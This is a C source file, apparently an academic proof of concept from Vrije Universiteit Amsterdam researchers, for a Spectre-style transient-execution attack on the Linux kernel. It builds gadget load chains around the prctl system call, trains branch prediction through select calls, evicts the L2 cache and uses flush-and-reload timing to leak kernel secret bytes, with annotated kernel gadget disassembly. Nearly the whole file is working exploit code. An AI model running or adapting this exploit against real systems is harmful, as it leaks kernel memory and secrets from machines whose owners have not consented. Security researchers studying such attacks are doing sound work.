/*
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */


#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/epoll.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"

#include "../../../common/l2_eviction/evict_l2.h"

// VICTIM 65c97028-fc9e-4b88-a5e3-7dd48150b62a __x64_sys_prctl
//   43   | ffffffff816e0266  mov     rbx, qword ptr [0xffffffff82d49688] ; set() -> {UncontrolledLoad@0xffffffff816e0266}
//   44   │ ffffffff816e026d  mov     dword ptr [rbp-0x2c], edi
//   45   │ ffffffff816e0270  mov     qword ptr [rbp-0x38], rsi
//   46   │ ffffffff816e0274  test    rbx, rbx
//   47   │ ffffffff816e0277  je      0xffffffff816e02db
//   48   │ ffffffff816e0279  mov     r12, rdx
//   49   │ ffffffff816e027c  mov     r13, rcx
//   50   │ ffffffff816e027f  mov     r14, r8
//   51   │ ffffffff816e0282  mov     r15d, 0xffffffda
//   52   │ ffffffff816e0288  mov     rax, qword ptr [rbx+0x18] ; {UncontrolledLoad@0xffffffff816e0266} -> {UncontrolledLoad@0xffffffff8
//        │ 16e0288}
//   53   │ ffffffff816e028c  mov     rsi, qword ptr [rbp-0x38]
//   54   │ ffffffff816e0290  mov     r8, r14
//   55   │ ffffffff816e0293  mov     rcx, r13
//   56   │ ffffffff816e0296  mov     edi, dword ptr [rbp-0x2c]
//   57   │ ffffffff816e0299  mov     rdx, r12
//   58   │ ffffffff816e029c  call    rax

void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {

    // ------------------------------------------------------------------------
    //    unix_poll (dispatch)
    //    0xffffffff8207c5c0 <unix_poll>:      nop    DWORD PTR [rax+rax*1+0x0]
    //    0xffffffff8207c5c5 <unix_poll+5>:    push   rbp
    //    0xffffffff8207c5c6 <unix_poll+6>:    mov    rbp,rsp
    //    0xffffffff8207c5c9 <unix_poll+9>:    push   r12
    //    0xffffffff8207c5cb <unix_poll+11>:   push   rbx
    //    0xffffffff8207c5cc <unix_poll+12>:   mov    r12,QWORD PTR [rsi+0x18]
    //    0xffffffff8207c5d0 <unix_poll+16>:   test   rdx,rdx
    //    0xffffffff8207c5d3 <unix_poll+19>:   je     0xffffffff8207c5ee <unix_poll+46>
    //    0xffffffff8207c5d5 <unix_poll+21>:   mov    rax,QWORD PTR [rdx]
    //    0xffffffff8207c5d8 <unix_poll+24>:   test   rax,rax
    //    0xffffffff8207c5db <unix_poll+27>:   je     0xffffffff8207c5ee <unix_poll+46>
    //    0xffffffff8207c5dd <unix_poll+29>:   add    rsi,0x40
    //    0xffffffff8207c5e1 <unix_poll+33>:   je     0xffffffff8207c5e8 <unix_poll+40>
    //    0xffffffff8207c5e3 <unix_poll+35>:   call   rax

    //    0xffffffff8123c2ad <rebind_subsystems+989>:  mov    rdx,QWORD PTR [rcx+r12*1]


    memset(cfg->ind_map, 0, 0x100);
    cfg->tfp_arg = 0;


    switch (number_of_loads)
    {
    case 1:
        cfg->fr_buf = cfg->ind_map + 0x2000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->fr_buf_kern - T_SECRET_ADDR__OFFSET;
        cfg->tfp_arg = cfg->ind_map_kern;

        *(uint64_t *)(cfg->ind_map) = 0x60606060606060;

        break;
    case 2:
        cfg->fr_buf = cfg->ind_map + 0x2000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->ind_map_kern;
        cfg->tfp_arg = cfg->fr_buf_kern;

        *(uint64_t *)(cfg->ind_map) = 0x60606060606060;

        break;

    case 3:
        cfg->fr_buf = cfg->ind_map + 0x1000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->ind_map_kern + 0x10 - T_SECRET_ADDR__OFFSET;


        cfg->tfp_arg = cfg->ind_map_kern;;
        *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->tfp_leak_target;

        cfg->gadget_arg_base = cfg->fr_buf_kern - 0xdeadcafe;

        *(uint64_t *)(cfg->ind_map + 0x10) = 0xdeadcafe; // the secret

        break;

    default:
        assert(0);
        break;
    }

    // ------------------------------------------------------------------------

}

void set_load_chain_leak_secret(struct config * cfg)
{
    // ------------------------------------------------------------------------
    //    unix_poll (dispatch)
    //    0xffffffff8207c5c0 <unix_poll>:      nop    DWORD PTR [rax+rax*1+0x0]
    //    0xffffffff8207c5c5 <unix_poll+5>:    push   rbp
    //    0xffffffff8207c5c6 <unix_poll+6>:    mov    rbp,rsp
    //    0xffffffff8207c5c9 <unix_poll+9>:    push   r12
    //    0xffffffff8207c5cb <unix_poll+11>:   push   rbx
    //    0xffffffff8207c5cc <unix_poll+12>:   mov    r12,QWORD PTR [rsi+0x18]
    //    0xffffffff8207c5d0 <unix_poll+16>:   test   rdx,rdx
    //    0xffffffff8207c5d3 <unix_poll+19>:   je     0xffffffff8207c5ee <unix_poll+46>
    //    0xffffffff8207c5d5 <unix_poll+21>:   mov    rax,QWORD PTR [rdx]
    //    0xffffffff8207c5d8 <unix_poll+24>:   test   rax,rax
    //    0xffffffff8207c5db <unix_poll+27>:   je     0xffffffff8207c5ee <unix_poll+46>
    //    0xffffffff8207c5dd <unix_poll+29>:   add    rsi,0x40
    //    0xffffffff8207c5e1 <unix_poll+33>:   je     0xffffffff8207c5e8 <unix_poll+40>
    //    0xffffffff8207c5e3 <unix_poll+35>:   call   rax

    //    0xffffffff8123c2ad <rebind_subsystems+989>:  mov    rdx,QWORD PTR [rcx+r12*1]

    memset(cfg->ind_map, 0, 0x100);

    // cfg->fr_buf = cfg->ind_map + 0x2000;
    // cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
    cfg->reload_addr = cfg->fr_buf;

    cfg->tfp_arg = cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->tfp_leak_target;

    cfg->ind_tb_addr = (uint64_t * ) (&cfg->gadget_arg_base);

    cfg->ind_secret_addr = (uint64_t * ) (&cfg->gadget_arg_secret_addr);

    *cfg->ind_tb_addr = (uint64_t)cfg->fr_buf_kern - T_BASE_OFFSET;

}

static void __always_inline __attribute__((always_inline)) trigger_target(struct config * cfg){

    assert(syscall(__NR_select, /*n=*/4, /*inp=*/0x0,/*outp=*/&cfg->fd_set, /*exp=*/0ul, /*tvp=*/0x0, cfg->train_rand_arg1) == 1);

}

// %rdi, %rsi, %rdx, %r10, %r8 and %r9.

char read_buf[32];

uint64_t old_gadget_arg_base = 0;

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    char buf_test[16];
    uint64_t hits = 0;

    for(int iter=0; iter < iterations; iter++) {

        flush(cfg->reload_addr);


        if (cfg->gadget_arg_secret_addr) {
            asm volatile("prefetcht0 (%0)" :: "r" (cfg->gadget_arg_secret_addr - T_SECRET_ADDR__OFFSET));
        }

        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->tfp_arg));

        // train

        trigger_target(cfg);
        trigger_target(cfg);

        evict(cfg->ev_set_l2);

        cpuid();

        //                     rdi = !=        rsi=rsi                                rdx=rdx                   r10=rcx/r13          r8=r8                       r9= !=
        syscall(VICTIM_SYSCALL, cfg->rand_arg1,(uint64_t) cfg->gadget_arg_secret_addr, (uint64_t) cfg->tfp_arg, cfg->gadget_arg_base, (uint64_t) cfg->rand_arg2, cfg->rand_arg3);


        cpuid();

        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}


int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;
    uint64_t prefix_offset = (prefix * STRIDE);

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0x0; byte <= 0xff; byte++) {


            fr_offset = (byte << 56);

            fr_offset = fr_offset * STRIDE;

            *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - T_BASE_OFFSET - prefix_offset);

            hits = do_flush_and_reload(cfg, 2, 1);
            if (hits > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define NLOADS 3
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits[NLOADS] = {0};
    cfg->reload_addr = cfg->fr_buf;

    for (int l = 0; l < NLOADS; l++) {
        set_load_chain_simple_touch(cfg, l + 1);
        hits[l] += do_flush_and_reload(cfg, iterations, 0);

    }

    for (int l = 0; l < NLOADS; l++)
    {
        printf("%6ld ", hits[l]);
        fflush(stdout);
    }

    printf("\n");


}
